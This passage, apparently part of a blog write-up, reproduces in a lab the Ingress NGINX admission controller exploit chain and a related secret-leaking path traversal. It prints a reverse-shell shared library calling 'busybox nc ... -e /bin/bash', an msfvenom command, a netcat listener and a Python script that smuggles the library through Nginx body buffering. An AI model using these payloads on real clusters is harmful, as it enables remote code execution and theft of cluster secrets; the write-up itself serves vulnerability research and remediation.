+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">host</span>: <span style="color:#ae81ff">hello-world.test</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">http</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">paths</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">backend</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">service</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">name</span>: <span style="color:#ae81ff">web</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">port</span>:
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">number</span>: <span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div><h3 id="loading-shared-library">Loading Shared Library</h3>
+<p>With the configuration injection working, we can now create the shared library. First, I created a test pod to act as a listener for an incoming reverse shell:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl run testpod --image<span style="color:#f92672">=</span>debian --command sleep -- 90d
+</span></span><span style="display:flex;"><span>kubectl exec -it testpod -- bash
+</span></span><span style="display:flex;"><span>root@testpod:/# nc -klnvp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span></code></pre></div><p>Then, I attempted to use <code>msfvenom</code> to create the malicious library which I manually copied into the pod:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p linux/x64/shell_reverse_tcp  LHOST<span style="color:#f92672">=</span>10.244.0.9 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span> -f elf-so -o test.so
+</span></span><span style="display:flex;"><span>kubectl cp -n ingress-nginx ./test.so ingress-nginx-controller-768f948f8f-rbxzs:/etc/nginx/test.so  
+</span></span></code></pre></div><p>I triggered the execution of the library with another request which surprisingly led to the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Error: signal: segmentation fault <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I tried to figure out what happened, and while investigating I also ran :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ <span style="color:#75715e"># ldd /etc/nginx/test.so </span>
+</span></span><span style="display:flex;"><span>        /lib/ld-musl-x86_64.so.1 <span style="color:#f92672">(</span>0x700ce0bb0000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I was surprised to see <code>musl</code> instead of <code>libc</code>, but this meant the container was built with Alpine Linux. Thus, I manually created a compatible shared library using an Alpine container:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -it alpine:latest /bin/sh
+</span></span><span style="display:flex;"><span>apk update
+</span></span><span style="display:flex;"><span>apk add build-base
+</span></span><span style="display:flex;"><span>apk add vim
+</span></span><span style="display:flex;"><span>gcc -shared -fPIC payload.c -o payload.so
+</span></span></code></pre></div><p><code>payload.c</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor)) <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/bash -c &#39;busybox nc 10.244.0.9 1337 -e /bin/bash&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker cp 767dbffd9991:/payload.so test.so
+</span></span><span style="display:flex;"><span>kubectl cp -n ingress-nginx ./test.so ingress-nginx-controller-768f948f8f-rbxzs:/etc/nginx/test.so  
+</span></span></code></pre></div><p>And with the new payload executed, a reverse shell was received as expected:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@testpod:/# nc -klnvp <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">1337</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.244.0.23<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.244.0.25<span style="color:#f92672">]</span> <span style="color:#ae81ff">40451</span>
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>101<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="file-upload">File Upload</h3>
+<p>The last piece of the puzzle was to upload the shared library so that it could later be referenced in the configuration file and thus executed.</p>
+<p>When Nginx receives a request with a body larger than its configured <a href="(https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size)"><code>client_body_buffer_size</code></a> (defaults are 8k/16k depending on architecture), it will save the body to a temporary file which means it is possible to send a request containing the shared library as the body, padded with null bytes to exceed the buffer size.</p>
+<p>So far, we have interacted only with the admission controller which is not based on nginx but on a go <code>http.Server</code>
+<em>(<code>/ingress/ingress-nginx/internal/ingress/controller/nginx.go</code>)</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">ValidationWebhook</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">validationWebhookServer</span> = <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Server</span>{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Addr</span>: <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">ValidationWebhook</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// G112 (CWE-400): Potential Slowloris Attack
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">ReadHeaderTimeout</span>: <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Second</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">Handler</span>:           <span style="color:#a6e22e">adm_controller</span>.<span style="color:#a6e22e">NewAdmissionControllerServer</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">adm_controller</span>.<span style="color:#a6e22e">IngressAdmission</span>{<span style="color:#a6e22e">Checker</span>: <span style="color:#a6e22e">n</span>}),
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">TLSConfig</span>:         <span style="color:#a6e22e">ssl</span>.<span style="color:#a6e22e">NewTLSListener</span>(<span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">ValidationWebhookCertPath</span>, <span style="color:#a6e22e">n</span>.<span style="color:#a6e22e">cfg</span>.<span style="color:#a6e22e">ValidationWebhookKeyPath</span>).<span style="color:#a6e22e">TLSConfig</span>(),
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// disable http/2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// https://github.com/kubernetes/kubernetes/issues/80313
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#75715e">// https://github.com/kubernetes/ingress-nginx/issues/6323#issuecomment-737239159
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">TLSNextProto</span>: make(<span style="color:#66d9ef">map</span>[<span style="color:#66d9ef">string</span>]<span style="color:#66d9ef">func</span>(<span style="color:#f92672">*</span><span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Server</span>, <span style="color:#f92672">*</span><span style="color:#a6e22e">tls</span>.<span style="color:#a6e22e">Conn</span>, <span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">Handler</span>)),
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>The actual Ingress proxy, that runs inside the same pod as its admission controller, is, however, based on Nginx and thus able to buffer our upload. But it will only be reachable after an actual ingress resource is created. Therefore, let&rsquo;s create and expose an example workload (<a href="https://hub.docker.com/r/hashicorp/http-echo)">https://hub.docker.com/r/hashicorp/http-echo)</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl run web --image<span style="color:#f92672">=</span>hashicorp/http-echo
+</span></span><span style="display:flex;"><span>kubectl expose pod web --port<span style="color:#f92672">=</span><span style="color:#ae81ff">5678</span>
+</span></span></code></pre></div><p>Create the following example ingress resource:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">example-ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">ingressClassName</span>: <span style="color:#ae81ff">nginx</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">rules</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#f92672">host</span>: <span style="color:#ae81ff">hello-world.example</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">http</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">paths</span>:
+</span></span><span style="display:flex;"><span>          - <span style="color:#f92672">path</span>: <span style="color:#ae81ff">/</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">pathType</span>: <span style="color:#ae81ff">Prefix</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">backend</span>:
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">service</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">name</span>: <span style="color:#ae81ff">web</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">port</span>:
+</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">number</span>: <span style="color:#ae81ff">5678</span>
+</span></span></code></pre></div><p>Apply it and check if the ingress is created:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>kubectl apply -f example_ingress.yaml
+</span></span><span style="display:flex;"><span>kubectl get ingress
+</span></span><span style="display:flex;"><span>NAME              CLASS   HOSTS                 ADDRESS        PORTS   AGE
+</span></span><span style="display:flex;"><span>example-ingress   nginx   hello-world.example   192.168.67.2   <span style="color:#ae81ff">80</span>      3d
+</span></span></code></pre></div><p>After it is created, we can test it with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://192.168.67.2/ -H <span style="color:#e6db74">&#34;Host: hello-world.example&#34;</span> 
+</span></span><span style="display:flex;"><span>hello-world
+</span></span></code></pre></div><p>Now that we have a reachable Nginx instance we can simulate the buffering behavior:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -X POST -d <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>head -c <span style="color:#ae81ff">9000</span> /dev/urandom | base64<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> http://192.168.67.2 -k --http1.1 
+</span></span></code></pre></div><p>This leads to the pod log confirming the buffering:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2025/03/29 13:14:35 <span style="color:#f92672">[</span>warn<span style="color:#f92672">]</span> 32#32: *155656 a client request body is buffered to a temporary file /tmp/nginx/client-body/0000000002, client: 192.168.67.1, server: _, request: <span style="color:#e6db74">&#34;POST / HTTP/1.1&#34;</span>, host: <span style="color:#e6db74">&#34;192.168.67.2&#34;</span>
+</span></span></code></pre></div><p>However, we are unable to open the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@ingress-nginx-controller-768f948f8f-rbxzs:/# cat /proc/1/cwd/tmp/nginx/client-body/0000000002
+</span></span><span style="display:flex;"><span>cat: /proc/1/cwd/tmp/nginx/client-body/0000000002: No such file or directory
+</span></span></code></pre></div><p>As explained in the original blog post, this temporary file is <a href="https://github.com/nginx/nginx/blob/e3a9b6ad08a86e799a3d77da3f2fc507d3c9699e/src/os/unix/ngx_files.c#L287">deleted almost immediately</a> but the Nginx worker process still holds an open file descriptor. We can specify the <code>Content-Length</code> header of our request to be larger than the actual body which causes Nginx to wait for additional data, extending the lifetime of the temporary file to the default <a href="https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size"><code>client_body_timeout</code></a> of 60 seconds.</p>
+<p>Using the following Python snippet, we can pad the shared library with null bytes, manually send the upload request to the Ingress endpoint with a slightly larger <code>Content-Length</code> header and keep the connection open:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_file</span>(file,ip,port):
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(file,<span style="color:#e6db74">&#34;br&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># make sure it is bigger than default &#34;client_body_buffer_size&#34; of 8k or 16k</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">16384</span> <span style="color:#f92672">-</span> len(data) <span style="color:#f92672">%</span> <span style="color:#ae81ff">16384</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;POST / HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Type: application/x-www-form-urlencoded</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Content-Length: </span><span style="color:#e6db74">{</span>len(data)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>) <span style="color:#f92672">+</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    sock <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> port <span style="color:#f92672">!=</span> <span style="color:#ae81ff">80</span>:
+</span></span><span style="display:flex;"><span>      context <span style="color:#f92672">=</span> ssl<span style="color:#f92672">.</span>create_default_context()
+</span></span><span style="display:flex;"><span>      context<span style="color:#f92672">.</span>check_hostname <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>      context<span style="color:#f92672">.</span>verify_mode <span style="color:#f92672">=</span> ssl<span style="color:#f92672">.</span>CERT_NONE
+</span></span><span style="display:flex;"><span>      ssl_sock <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>wrap_socket(sock, server_hostname<span style="color:#f92672">=</span>ip)
+</span></span><span style="display:flex;"><span>      ssl_sock<span style="color:#f92672">.</span>connect((ip,port))
+</span></span><span style="display:flex;"><span>      ssl_sock<span style="color:#f92672">.</span>sendall(data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>      sock<span style="color:#f92672">.</span>connect((ip,port))
+</span></span><span style="display:flex;"><span>      sock<span style="color:#f92672">.</span>sendall(data)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">50</span>) 
+</span></span></code></pre></div><p>Combining everything we know so far allows us to write an exploit that uploads the malicios library and then injects nginx configurations until the right <code>/proc/PID/fd/FD</code> is guessed to get the shell:</p>
+<p><img src="./shell.png" alt=""></p>
+<p>While this worked flawlessly in the lab, real-world exploitation against an internet-exposed admission controller is significantly more challenging.</p>
+<ul>
+<li>First, the Ingress NGINX admission controller is, by default, only accessible from inside the cluster and should not be exposed externally.</li>
+<li>Second, the window of opportunity is narrow. An attacker would need to guess or brute-force a large number of potential process IDs and file descriptors within the timeout period.</li>
+<li>Third, buffering a file upload must actually be possible. Depending on the specific Nginx configuration (e.g. <code>client_body_buffer_size</code>), this might not occur, or if intermediate proxies (like external load balancers) handle buffering differently or enforce smaller request limits, the upload to a temporary file might not occur on the target Nginx instance.</li>
+<li>Finally, a well-segmented cluster network could block the outgoing connection required for a reverse shell, preventing the attacker from retrieving data or gaining control.</li>
+</ul>
+<p>A successful exploitation is thus significantly more likely from within the cluster or adjacent network segments where both the admission controller and the Nginx proxy are reachable. Also note that, given the default privileges of the admission controller, a successful attack would not only mean code execution but also likely grant access to all secrets within the Kubernetes cluster. This implies that if any other web application inside the cluster is compromised, exploiting the Ingress NGINX admission controller could potentially allow an attacker to gain full control over the Kubernetes cluster.</p>
+<p>Therefore, please follow the <a href="https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/#your-next-steps">remediation guidance</a> published by Kubernetes.</p>
+<p>Lastly, I want to congratulate the Wiz researchers <a href="https://x.com/nirohfeld">@nirohfeld</a>, <a href="https://x.com/sagitz_">@sagitz_</a>, <a href="https://x.com/ronenshh">@ronenshh</a>, <a href="https://x.com/hillai">@hillai</a> and <a href="https://x.com/andresriancho">@andresriancho</a> for finding this exploit chain; it was great fun to reproduce it.</p>
+<h3 id="bonus-round">Bonus Round</h3>
+<p>An additional vulnerability, <a href="https://github.com/advisories/GHSA-242m-6h72-7hgp">CVE-2025-24513</a> is barely mentioned in the original report. The <a href="https://github.com/kubernetes/ingress-nginx/pull/13068/files">merge request</a> intended to fix all mentioned vulnerabilities also adds checks against a path traversal:</p>
+<p><img src="./git_diff.png" alt=""></p>
+<p>It turns out that if we know the name and UID of an existing secret, we can retrieve it in clear text and write its contents to an arbitrary location within the pod&rsquo;s filesystem:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">networking.k8s.io/v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Ingress</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">example-ingress</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">namespace</span>: <span style="color:#ae81ff">default</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">uid</span>: <span style="color:#e6db74">&#34;somename&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">annotations</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/auth-type</span>: <span style="color:#ae81ff">basic</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/auth-secret</span>: <span style="color:#ae81ff">some-secret</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">nginx.ingress.kubernetes.io/auth-secret-type</span>: <span style="color:#ae81ff">auth-map</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /etc/ingress-controller/auth/default-somename-484a9231-7596-48d4-b392-6c55222dd757.passwd 
+</span></span><span style="display:flex;"><span>key:Password123!
+</span></span></code></pre></div><h1 id="annex">Annex</h1>
+<p><code>/tmp/nginx/nginx-cfg2090142930</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nginx" data-lang="nginx"><span style="display:flex;"><span><span style="color:#75715e"># Configuration checksum: 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># setup custom paths that do not require root access
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pid</span> <span style="color:#e6db74">/tmp/nginx/nginx.pid</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">daemon</span> <span style="color:#66d9ef">off</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">worker_processes</span> <span style="color:#ae81ff">6</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">worker_rlimit_nofile</span> <span style="color:#ae81ff">1047552</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">worker_shutdown_timeout</span> <span style="color:#e6db74">240s</span> ;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">events</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">multi_accept</span>        <span style="color:#66d9ef">on</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">worker_connections</span>  <span style="color:#ae81ff">16384</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">use</span>                 <span style="color:#e6db74">epoll</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">http</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_package_path</span> <span style="color:#e6db74">&#34;/etc/nginx/lua/?.lua</span>;;<span style="color:#f92672">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">balancer_ewma</span> <span style="color:#e6db74">10M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">balancer_ewma_last_touched_at</span> <span style="color:#e6db74">10M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">balancer_ewma_locks</span> <span style="color:#e6db74">1M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">certificate_data</span> <span style="color:#e6db74">20M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">certificate_servers</span> <span style="color:#e6db74">5M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">configuration_data</span> <span style="color:#e6db74">20M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">global_throttle_cache</span> <span style="color:#e6db74">10M</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">lua_shared_dict</span> <span style="color:#e6db74">ocsp_response_cache</span> <span style="color:#e6db74">5M</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">init_by_lua_block</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">collectgarbage(&#34;collect&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">--</span> <span style="color:#e6db74">init</span> <span style="color:#e6db74">modules</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">local</span> <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">ok,</span> <span style="color:#e6db74">res</span> = <span style="color:#e6db74">pcall(require,</span> <span style="color:#e6db74">&#34;lua_ingress&#34;)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">if</span> <span style="color:#e6db74">not</span> <span style="color:#e6db74">ok</span> <span style="color:#e6db74">then</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">error(&#34;require</span> <span style="color:#e6db74">failed:</span> <span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">..</span> <span style="color:#e6db74">tostring(res))</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">else</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">lua_ingress</span> = <span style="color:#e6db74">res</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">lua_ingress.set_config(</span>{
+</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">use_forwarded_headers</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">use_proxy_protocol</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">is_ssl_passthrough_enabled</span> = <span style="color:#e6db74">false,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">http_redirect_code</span> = <span style="color:#ae81ff">308</span><span style="color:#e6db74">,</span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#e6db74">listen_ports</span> = { <span style="color:#f92672">ssl_proxy</span> = <span style="color:#e6db74">&#34;442&#34;,</span> <span style="color:#e6db74">https</span> = <span style="color:#e6db74">&#34;443&#34;</span> <span style="color:#960050;background-color:#1e0010">}</span><span style="color:#e6db74">,</span>
+</span></span><span style="display:flex;"><span>
